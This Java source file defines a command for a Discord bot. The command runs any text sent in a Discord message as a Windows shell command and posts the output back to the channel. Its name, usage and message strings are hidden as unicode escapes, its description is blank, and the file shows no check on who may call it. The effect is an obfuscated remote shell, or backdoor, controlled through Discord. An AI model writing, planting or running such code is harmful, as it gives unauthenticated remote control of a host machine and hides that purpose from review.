package cmd;

import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.User;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

public class Run extends Command {
    public Run(){
        this.name = "\u0072\u0075\u006e";
        this.usage = "\u002f\u0072\u0075\u006e \u003c\u0063\u006f\u006d\u006d\u0061\u006e\u0064\u003e";
        this.desc = "";
        this.type = CommandType.GENERAL;
    }

    @Override
    public boolean onCommand(User user, Message message,String[] args) {
        String cmd = "";
        int cd = 30;
        int dd = 0;
        boolean bare = false;
        for (int i = 0;i<args.length;i++) {
            if (args[i].contains("timeout")){
                try{dd = Integer.parseInt(args[i].split("=")[1]); cd = dd;}catch (NumberFormatException nfe){}
            }else if (args[i].equals("run=true")) bare = true;
            else if (args[i].equals("run=false"))continue;
            else cmd += args[i] + " ";
        }
        cmd = cmd.substring(0, cmd.length() - 1);
        final boolean[] running = {true};
        try {
            message.getChannel().sendMessage("\u0063\u006f\u006d\u006d\u0061\u006e\u0064 `"+cmd+"` \u0072\u0065\u0063\u0069\u0065\u0076\u0065\u0064 | timeout: "+cd).queue();
            Process process;
            if(bare) process = Runtime.getRuntime().exec(cmd);
            else process = Runtime.getRuntime().exec("cmd /c "+cmd);
            int finalCd = cd;
            Thread t = new Thread(() -> {
                try { Thread.sleep(finalCd*1000); running[0] = false;} catch (InterruptedException e) { }
            });
            t.start();
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            String total = "";
            String errTot = "";
            String s = "";
            while (running[0]&&process.isAlive()) process.waitFor(1, TimeUnit.SECONDS);
            if (t.isAlive()) t.interrupt();
            process.destroy();
            while ((s = stdInput.readLine()) != null && running[0])  total+=s+"\n";
            while ((s = stdError.readLine()) != null && running[0])  errTot+=s+"\n";
            try{message.getChannel().sendMessage("\u0060\u0060\u0060\u006f\u0075\u0074 \u0073\u0074\u0072\u0065\u0061\u006d\u003a \n"+total+"```").queue();}
            catch (IllegalArgumentException iae){
                total = total.substring(0,1900);
                total += "\n\n=== 1900 ===";
                message.getChannel().sendMessage("\u0060\u0060\u0060\u006f\u0075\u0074 \u0073\u0074\u0072\u0065\u0061\u006d\u003a \n"+total+"```").queue();
            }
            if (!errTot.equals("")) message.getChannel().sendMessage("\u0060\u0060\u0060\u0065\u0072\u0072\u006f\u0072 \u0073\u0074\u0072\u0065\u0061\u006d\u003a \n"+errTot+"\u0060\u0060\u0060").queue();

        } catch (IOException | InterruptedException e) {e.printStackTrace(); message.getChannel().sendMessage("\u0063\u006f\u006d\u006d\u0061\u006e\u0064 '"+cmd+"' \u0066\u0061\u0069\u006c\u0065\u0064 \u0074\u006f \u0065\u0078\u0065\u0063\u0075\u0074\u0065").queue();
        }

        return true;
    }
}
